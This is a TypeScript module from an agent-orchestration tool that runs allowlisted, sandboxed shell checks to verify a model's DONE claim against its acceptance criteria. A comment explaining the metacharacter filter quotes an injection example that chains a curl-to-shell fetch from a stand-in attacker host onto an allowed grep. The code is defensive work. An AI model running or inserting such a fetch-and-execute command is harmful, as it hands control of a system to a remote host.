import { exec } from "node:child_process";
import { promisify } from "node:util";
import type { RunSandboxContext } from "./sandbox/context";
import { runSandboxedCommand } from "./sandbox/srt";
import { errorMessage } from "@/shared/errorMessage";

const execAsync = promisify(exec);

/**
 * Checking a DONE claim before paying for an evaluation.
 *
 * Spec 18 §7. The loop's DONE signal is the model's own word. On the card this
 * came from, a run exited `done-signal` at 14:13; four evaluator runs and
 * about fifty minutes later the verdict was "2 to 18 pass; 1, 19 and 20 fail".
 * Nothing had looked.
 *
 * The probe is deliberately one-sided. Acceptance criteria are prose with
 * commands embedded in backticks, and some carry a judgment a shell cannot
 * make ("returns at least 3 wrapper scripts"), so a zero exit does NOT prove a
 * criterion. A non-zero exit disproves one, and that is the only claim
 * anything here makes.
 */

/** Per command. Long enough for a build-flavoured check, short enough that a
 * hung one cannot become a second hard timeout. */
const PROBE_TIMEOUT_MS = 30_000;
/** Never let a runaway check fill memory with output nobody will read. */
const PROBE_MAX_BUFFER = 1024 * 1024;
/** Enough failing output to act on, not enough to bury the next prompt. */
const PROBE_OUTPUT_CHARS = 800;

/**
 * The first word of every command the probe will run.
 *
 * An allowlist rather than a shape heuristic, so "the probe only ever looks"
 * is something a reader can check here rather than something they have to
 * trust. Acceptance criteria are written by the planner, which is a model, and
 * this runs them without one in the loop; a criterion whose command falls
 * outside this list is reported as not probed rather than quietly treated as
 * passing.
 *
 * The first word is only half the guard — see SHELL_METACHARACTER.
 */
const PROBE_ALLOWED = new Set([
  "cat", "cmp", "command", "diff", "file", "find", "grep", "head", "jq", "ls",
  "rg", "sed", "stat", "tail", "test", "wc", "which",
]);

/** Backticked spans in the criteria document. */
const BACKTICK_SPAN = /`([^`\n]+)`/g;

/**
 * Anything the shell would act on rather than pass through as an argument:
 * command separators and lists (`;`, `&`, `|`), substitution (`$`), a
 * subshell (`(`, `)`), and redirection (`<`, `>`).
 *
 * The allowlist above vouches for a span's FIRST word only, and the span then
 * goes to a shell whole — so `grep -q x file; curl evil.example | sh` passed
 * the allowlist and ran in full, which is precisely what an allowlist is
 * supposed to make impossible. Backticks and newlines cannot appear in a span
 * by construction (BACKTICK_SPAN). Glob characters are deliberately NOT here:
 * they expand to names in the worktree and nothing else, and real criteria use
 * them (`find bin -name 'wrap_*'`).
 */
const SHELL_METACHARACTER = /[;&|$<>()]/;

/**
 * Prose right after a span that says the command is meant to exit non-zero:
 * "`grep -rq old_name src` fails (no references remain)". Such a criterion is
 * disproven by a ZERO exit, so the probe inverts it. Read the other way round,
 * a correctly written negative criterion sent every card that had one into a
 * repair task it could not satisfy.
 */
const EXPECT_FAILURE =
  /^\s*(?:fails|(?:exits|returns) (?:with )?(?:a )?non-?zero|does not succeed|must fail|should fail|finds nothing|matches nothing)\b/i;

export type ProbeCommand = {
  command: string;
  /** The criterion says this command must exit non-zero. */
  expectFailure: boolean;
};

export type ProbeResult = {
  command: string;
  expectFailure: boolean;
  /** False only when the command ran and exited the wrong way: non-zero, or
   * zero for a check the criterion says must fail. The one thing this probe is
   * entitled to conclude. */
  ok: boolean;
  output: string;
};

/**
 * The runnable check commands embedded in an acceptance-criteria document.
 *
 * Backticks in these documents hold both commands (`test -f docs/USAGE.md`)
 * and bare filenames (`bin/wrap_claude`), so a span counts only when its first
 * word is an allowed check command, something follows it, and the whole span
 * is one command rather than a shell script. A span the criterion says `fails`
 * is marked so (EXPECT_FAILURE). Duplicates are dropped: the same check
 * written against two criteria is still one check.
 */
export function probeCommands(acceptanceCriteria: string): ProbeCommand[] {
  const found = new Map<string, ProbeCommand>();
  for (const match of acceptanceCriteria.matchAll(BACKTICK_SPAN)) {
    const command = match[1].trim();
    if (SHELL_METACHARACTER.test(command)) continue;
    const [head, ...rest] = command.split(/\s+/);
    if (rest.length === 0 || !PROBE_ALLOWED.has(head) || found.has(command)) continue;
    const after = acceptanceCriteria.slice(match.index + match[0].length);
    found.set(command, { command, expectFailure: EXPECT_FAILURE.test(after) });
  }
  return [...found.values()];
}

/**
 * Run each check in the worktree and report the ones that failed.
 *
 * Wrapped in the run's own sandbox policy when it has one, so a probe command
 * is contained exactly as the agent's bash is. Sequential rather than
 * concurrent: a handful of greps is not worth the contention on the
 * process-wide network policy `runSandboxedCommand` claims.
 */
export async function runAcceptanceProbe(opts: {
  acceptanceCriteria: string;
  worktreePath: string;
  ctx: RunSandboxContext;
}): Promise<ProbeResult[]> {
  const { ctx } = opts;
  const results: ProbeResult[] = [];
  for (const { command, expectFailure } of probeCommands(opts.acceptanceCriteria)) {
    // The prefix is newline-separated lines ending in `|| true`, with no
    // trailing separator of its own. Concatenating the command straight onto
    // it makes it the right-hand side of that `||`, which never runs — the
    // probe then reads every check as passing. Join explicitly.
    const prefixed = ctx.commandPrefix ? `${ctx.commandPrefix}\n${command}` : command;
    // `runOne` reports its own failures, so the only thing that escapes here
    // is a wrap that could not be built. Then do not run it at all: reported
    // as unprobed, never as a failure, because the criterion is not disproven
    // by our own plumbing.
    try {
      results.push(
        ctx.srtConfig
          ? await runSandboxedCommand(
              prefixed,
              ctx.srtConfig,
              (wrapped) => runOne(command, expectFailure, wrapped, opts.worktreePath, ctx.env),
              { tmpdir: ctx.tmpdir },
            )
          : await runOne(command, expectFailure, prefixed, opts.worktreePath, ctx.env),
      );
    } catch (e) {
      console.warn(`acceptance probe skipped "${command}": ${errorMessage(e)}`);
    }
  }
  return results;
}

/** One check, run to completion. Never throws: every outcome is a
 * ProbeResult, so the caller can tell a check that ran from a wrap that could
 * not be built. */
async function runOne(
  command: string,
  expectFailure: boolean,
  toRun: string,
  cwd: string,
  env: NodeJS.ProcessEnv | undefined,
): Promise<ProbeResult> {
  const trimmed = (stdout: string | undefined, stderr: string | undefined) =>
    `${stdout ?? ""}${stderr ?? ""}`.trim().slice(0, PROBE_OUTPUT_CHARS);
  try {
    const { stdout, stderr } = await execAsync(toRun, { cwd, env, timeout: PROBE_TIMEOUT_MS, maxBuffer: PROBE_MAX_BUFFER });
    // A zero exit disproves only a check the criterion says must fail.
    return { command, expectFailure, ok: !expectFailure, output: expectFailure ? trimmed(stdout, stderr) : "" };
  } catch (e) {
    const err = e as { code?: number | string; killed?: boolean; stdout?: string; stderr?: string };
    // A timeout or a missing binary says nothing about the criterion — only
    // a command that ran to an exit status does.
    if (err.killed || typeof err.code !== "number") return { command, expectFailure, ok: true, output: "" };
    return { command, expectFailure, ok: expectFailure, output: expectFailure ? "" : trimmed(err.stdout, err.stderr) };
  }
}

/** The repair task appended to the private plan when checks failed. Names the
 * commands and what they printed, because the agent cannot see this probe. */
export function repairTaskText(failures: ProbeResult[]): string {
  const lines = failures.map((f) => {
    const verdict = f.expectFailure ? " (the criterion says this must exit non-zero, and it exited 0)" : "";
    return `  - \`${f.command}\`${verdict}${f.output ? `\n    ${f.output.split("\n").join("\n    ")}` : ""}`;
  });
  return [
    "Repair the acceptance checks that do not pass yet. These commands were run",
    "in the worktree after you signalled DONE, and each exited non-zero (or,",
    "where noted, exited 0 when the criterion says it must fail):",
    "",
    ...lines,
    "",
    "Fix the underlying problem rather than the command. If a check cannot be",
    "satisfied because it is wrong about this repository, say so in",
    "`.ralph/ITERATION_DONE` and leave the code alone.",
  ].join("\n");
}
